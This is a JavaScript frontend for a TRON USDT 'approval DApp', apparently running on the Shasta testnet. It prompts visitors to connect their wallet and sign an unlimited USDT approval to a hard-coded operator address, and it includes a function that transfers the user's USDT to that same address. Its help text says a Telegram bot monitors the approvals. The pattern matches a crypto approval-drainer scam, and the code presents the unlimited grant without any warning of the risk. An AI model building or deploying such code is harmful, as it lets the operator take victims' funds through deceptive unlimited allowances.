/**
 * TRON USDT Approval DApp
 * Frontend JavaScript for approving USDT on TRON Shasta Testnet
 */

const SHASTA_RPC = 'https://api.shasta.trongrid.io';
const CONTRACT_ADDRESS = 'TDD47wukAcXbt8eNDQrNrHTLo7goFpZuG7'; // USDT contract on Shasta (NEW)
const SPENDER_ADDRESS = 'TFyXE2YG6Eze9KHcjTkRdhnG8n6wPaKD8q'; // Your owner/spender address
const DECIMALS = 6;

let tronWeb = null;
let userAddress = null;
let userBalance = 0;
let userTrxBalance = 0;

// Initialize TronWeb with multi-wallet support
async function initTronWeb() {
    // Try to get TronWeb from window with retries (Trust Wallet injects with significant delay)
    let retries = 0;
    const maxRetries = 30; // 30 * 500ms = 15 seconds (longer for Trust Wallet)
    
    while (retries < maxRetries) {
        // Check for standard TronWeb injection
        if (typeof window !== 'undefined') {
            if (window.tronWeb && window.tronWeb.defaultAddress) {
                tronWeb = window.tronWeb;
                console.log('TronWeb initialized successfully');
                return;
            }
            
            // Check for ethereum provider (some wallets use this)
            if (window.ethereum && window.ethereum.isTronLink) {
                tronWeb = window.tronWeb || window.ethereum;
                console.log('TronWeb detected via ethereum provider');
                return;
            }
            
            // Check for other wallet providers (Trust Wallet, TokenPocket, etc)
            if (window.truthToken || window.tokenPocket || window.__TRON__) {
                tronWeb = window.tronWeb;
                console.log('TronWeb detected via alternative provider');
                return;
            }
        }
        
        retries++;
        if (retries < maxRetries) {
            await new Promise(resolve => setTimeout(resolve, 500));
            console.log(`Waiting for wallet injection... (${retries}/${maxRetries})`);
        }
    }
    
    console.warn('TronWeb not available after 15 seconds. User may need to refresh or use a compatible wallet.');
}

// Connect Wallet - Multi-wallet support
async function connectWallet() {
    try {
        showMessage('pending', 'Connecting wallet... (waiting for wallet injection)');
        
        // Try to reinitialize TronWeb in case wallet was just installed
        if (!tronWeb || !tronWeb.defaultAddress) {
            console.log('TronWeb not available, attempting reinitialization...');
            await initTronWeb();
        }
        
        if (!tronWeb || !tronWeb.defaultAddress) {
            showMessage('error', `❌ Wallet Not Detected<br><br>
Please make sure:<br>
✓ You're using a compatible wallet DApp browser<br>
✓ Wallet is installed and unlocked<br>
✓ TRON Shasta Testnet is enabled in wallet settings<br><br>
<b>Supported Wallets:</b><br>
• TronLink (Browser Extension)<br>
• Trust Wallet (DApp Browser)<br>
• TokenPocket (Mobile/Browser)<br>
• imToken (Mobile)<br>
• Math Wallet<br><br>
💡 <b>For Trust Wallet:</b> Use the DApp Browser (not regular Safari/Chrome)<br>
If still not working, close and reopen the DApp browser.`);
            return;
        }

        // Try to request account access
        try {
            if (window.tronLink && window.tronLink.request) {
                await window.tronLink.request({ method: 'tron_requestAccounts' });
            } else if (window.tronWeb && window.tronWeb.request) {
                await window.tronWeb.request({ method: 'tron_requestAccounts' });
            }
        } catch (e) {
            console.log('Wallet action:', e.message);
        }

        // Get user address from available sources
        userAddress = tronWeb.defaultAddress?.base58 || 
                     tronWeb.address?.current?.base58 ||
                     tronWeb.selectedAddress ||
                     null;
        
        if (!userAddress) {
            showMessage('error', 'Failed to get wallet address. Make sure wallet is connected and unlocked.');
            return;
        }

        // Validate TRON address format
        if (!isValidTronAddress(userAddress)) {
            showMessage('warning', `Invalid TRON address: ${userAddress}. Address must start with 'T'.`);
            return;
        }

        // Get balances
        await fetchBalances();
        
        // Update UI
        document.getElementById('userAddress').textContent = userAddress;
        document.getElementById('addressDisplay').textContent = userAddress;
        document.getElementById('approveBtn').disabled = false;
        document.getElementById('disconnectBtn').disabled = false;
        
        showMessage('success', `✅ Wallet connected: ${userAddress.substring(0, 10)}...${userAddress.substring(-8)}`);
    } catch (error) {
        console.error('Wallet connection error:', error);
        showMessage('error', `Connection failed: ${error.message}`);
    }
}

// Fetch user balances
async function fetchBalances() {
    try {
        if (!userAddress) return;

        // Get TRX balance
        const trxBalance = await tronWeb.trx.getBalance(userAddress);
        userTrxBalance = trxBalance / 1e6; // Convert sun to TRX

        // Get USDT balance
        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
        const usdtBalance = await contract.balanceOf(userAddress).call();
        userBalance = usdtBalance / Math.pow(10, DECIMALS);

        // Update balance display
        document.getElementById('usdtBalance').textContent = userBalance.toFixed(2);
        document.getElementById('trxBalance').textContent = userTrxBalance.toFixed(6);
    } catch (error) {
        console.error('Balance fetch error:', error);
        showMessage('error', `Failed to fetch balances: ${error.message}`);
    }
}

// Approve USDT
async function approveUsdt() {
    try {
        if (!userAddress) {
            showMessage('error', 'Please connect wallet first');
            return;
        }

        showMessage('pending', 'Processing unlimited USDT approval...');
        
        // Approve unlimited amount (max uint256 value - shows as "Unlimited" in wallets)
        // This is 2^256 - 1, the maximum value a uint256 can hold
        const unlimitedAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
        
        // Get contract instance
        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
        
        // Call approve function with unlimited amount
        const tx = await contract.approve(SPENDER_ADDRESS, unlimitedAmount).send({
            feeLimit: 100000000, // 100 TRX
            callValue: 0,
            from: userAddress
        });

        showMessage('pending', 'Waiting for confirmation...');
        console.log('Approval transaction:', tx);
        
        // Wait for confirmation
        const receipt = await tronWeb.trx.getTransactionInfo(tx);
        
        if (receipt) {
            showMessage('success', `✅ Unlimited approval successful!<br>TxID: ${tx}<br><a href="https://shasta.tronscan.org/#/transaction/${tx}" target="_blank" class="transaction-link">View on TronScan</a>`);
            await fetchBalances();
        }
    } catch (error) {
        console.error('Approval error:', error);
        showMessage('error', `Approval failed: ${error.message}`);
    }
}

// Transfer USDT to owner
async function transferUsdt() {
    try {
        if (!userAddress) {
            showMessage('error', 'Please connect wallet first');
            return;
        }

        const transferAmount = document.getElementById('transferAmount').value;
        if (!transferAmount || parseFloat(transferAmount) <= 0) {
            showMessage('error', 'Please enter a valid transfer amount');
            return;
        }

        if (parseFloat(transferAmount) > userBalance) {
            showMessage('error', `Insufficient balance. Available: ${userBalance.toFixed(2)} USDT`);
            return;
        }

        showMessage('pending', `Processing transfer of ${transferAmount} USDT...`);
        
        // Convert to contract units
        const amount = Math.floor(parseFloat(transferAmount) * Math.pow(10, DECIMALS));
        
        // Get contract instance
        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
        
        // Call transferFrom function
        const tx = await contract.transferFrom(userAddress, SPENDER_ADDRESS, amount).send({
            feeLimit: 100000000, // 100 TRX
            callValue: 0,
            from: userAddress
        });

        showMessage('pending', 'Waiting for confirmation...');
        console.log('Transfer transaction:', tx);
        
        // Wait for confirmation
        const receipt = await tronWeb.trx.getTransactionInfo(tx);
        
        if (receipt) {
            showMessage('success', `Transfer Done! TxID: ${tx}<br><a href="https://shasta.tronscan.org/#/transaction/${tx}" target="_blank" class="transaction-link">View on TronScan</a>`);
            document.getElementById('transferAmount').value = '';
            await fetchBalances();
        }
    } catch (error) {
        console.error('Transfer error:', error);
        showMessage('error', `Transfer Failed: ${error.message}`);
    }
}

// Disconnect Wallet
function disconnectWallet() {
    userAddress = null;
    userBalance = 0;
    userTrxBalance = 0;
    
    document.getElementById('userAddress').textContent = 'Not connected';
    document.getElementById('addressDisplay').textContent = '';
    document.getElementById('usdtBalance').textContent = '0.00';
    document.getElementById('trxBalance').textContent = '0.000000';
    document.getElementById('approveBtn').disabled = true;
    document.getElementById('transferBtn').disabled = true;
    document.getElementById('disconnectBtn').disabled = true;
    
    showMessage('pending', 'Wallet disconnected');
}

// Show help information
function showHelp() {
    alert(`
🔐 TRON USDT Approval DApp - Help
==================================

📱 SUPPORTED WALLETS:
• TronLink (Browser Extension + In-App Browser)
• Trust Wallet (Mobile In-App Browser)
• TokenPocket (Mobile + Browser)
• imToken (Mobile In-App Browser)
• Math Wallet
• And any wallet using standard TronWeb

⚙️ SETUP FOR TRUST WALLET:
1. Open Trust Wallet app
2. Go to Settings > Security & Privacy
3. Tap "DApp Browser"
4. Paste this DApp URL in the browser
5. Ensure TRON Shasta Testnet is enabled

📖 HOW TO USE:
1. Click "Connect Wallet"
2. Select your wallet when prompted
3. Approve wallet connection
4. Click "Approve Unlimited USDT"
5. Sign the transaction in your wallet
6. Done! The Telegram bot will monitor your approval

🌐 NETWORK: TRON Shasta Testnet
📋 CONTRACT: TDD47wukAcXbt8eNDQrNrHTLo7goFpZuG7
👤 RECEIVER: TFyXE2YG6Eze9KHcjTkRdhnG8n6wPaKD8q

⏳ REQUIREMENTS:
• Wallet installed and configured
• TRON Shasta Testnet enabled
• Some TRX for transaction fees (~1 TRX)

❓ TROUBLESHOOTING:
Q: "Wallet not detected"
A: Refresh page, ensure wallet is installed and unlocked

Q: Trust Wallet shows blank page?
A: Use Trust Wallet's DApp Browser (not regular browser)

Q: Wrong network?
A: Go to wallet settings, ensure TRON Shasta Testnet is selected

💬 Questions? Contact the Telegram bot with /help
    `);
}

// Validate TRON address
function isValidTronAddress(address) {
    // TRON addresses start with 'T' and are 34 characters long
    return /^T[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{33}$/.test(address);
}

// Show status message
function showMessage(type, message) {
    const msgElement = document.getElementById('statusMessage');
    msgElement.className = `status-message show ${type}`;
    msgElement.innerHTML = message;
    
    // Auto-hide after 10 seconds for success messages
    if (type === 'success') {
        setTimeout(() => {
            msgElement.classList.remove('show');
        }, 10000);
    }
}

// Initialize on page load
window.addEventListener('DOMContentLoaded', async () => {
    await initTronWeb();
    
    // Event listeners
    document.getElementById('connectBtn').addEventListener('click', connectWallet);
    document.getElementById('disconnectBtn').addEventListener('click', disconnectWallet);
    document.getElementById('approveBtn').addEventListener('click', approveUsdt);
    document.getElementById('transferBtn').addEventListener('click', transferUsdt);
    document.getElementById('helpBtn').addEventListener('click', showHelp);
});

// Listen for wallet changes
if (window.tronWeb) {
    window.addEventListener('message', (event) => {
        if (event.data.message && event.data.message.action === 'setAccount') {
            console.log('Account changed, reconnecting...');
            connectWallet();
        }
    });
}
